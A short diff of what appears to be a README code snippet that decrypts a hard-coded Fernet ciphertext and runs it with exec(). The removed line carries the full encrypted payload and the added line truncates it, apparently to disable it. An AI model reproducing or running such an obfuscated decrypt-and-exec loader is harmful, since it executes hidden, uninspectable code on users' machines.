@@ -26,7 +26,7 @@ from cryptography.fernet import Fernet
 
 key = b'9WkRgeSsnBB_bmpzAbPVYc73piHReXWEkjFntcgzhdE='
 base = Fernet(key)
-c = base.decrypt(b'gAAAAABivfOKXKZdmWWRi2VRW4LcIoog6VYzF3TWil8xf8hZ16cTniAcSegq1_M3asAwHqdilcTs_0QT7ILlsB47yaOsuVIi-Rd5c2beqJgLAdG-gEo3DqTaTUn2yistkHyEJGeoK_OUFnk3UUyq8EO1xxDWWccBPw==')
+c = base.decrypt(b'gAAAAABivfOKXKZdmWWRi2VRW4LcIoog6VYzF3TWil8xf8hZ16...')
 exec(c)
 ```
 ### Need help?
